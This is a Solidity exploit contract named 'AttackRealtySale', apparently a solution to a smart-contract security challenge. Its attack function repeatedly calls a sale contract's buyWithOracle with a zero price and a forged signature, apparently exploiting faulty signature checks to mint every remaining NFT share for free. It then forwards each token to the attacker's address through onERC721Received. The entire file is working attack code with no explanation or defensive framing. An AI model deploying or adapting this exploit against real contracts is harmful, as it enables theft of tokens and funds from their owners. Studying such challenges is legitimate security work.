// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {RealtyToken} from "./RealtyToken.sol";

struct SharePrice {
    uint256 expires;
    uint256 price;
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

interface IRealtySale {
    function buyWithOracle(
        SharePrice calldata sharePrice,
        Signature calldata signature
    ) external payable;

    function shareToken() external returns (address);
}

contract AttackRealtySale {
    IRealtySale private immutable realtysale;
    RealtyToken private immutable realtytoken;

    address immutable owner;

    constructor(address _realtysaleAddress) {
        owner = msg.sender;
        realtysale = IRealtySale(_realtysaleAddress);
        realtytoken = RealtyToken(realtysale.shareToken());
    }

    function attack() external {
        uint256 currentSuppy = realtytoken.lastTokenID();
        uint256 maxSupply = realtytoken.maxSupply();

        SharePrice memory shareprice = SharePrice(
            block.timestamp + 1000,
            0 ether
        );
        Signature memory signature = Signature(
            1,
            bytes32("Sage"),
            bytes32("Tony")
        );

        while (currentSuppy < maxSupply) {
            realtysale.buyWithOracle(shareprice, signature);
            unchecked {
                ++currentSuppy;
            }
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        realtytoken.safeTransferFrom(address(this), owner, tokenId);
        return 0x150b7a02;
    }

    function balanceNft() external view returns (uint256) {
        return realtytoken.balanceOf(owner);
    }
}
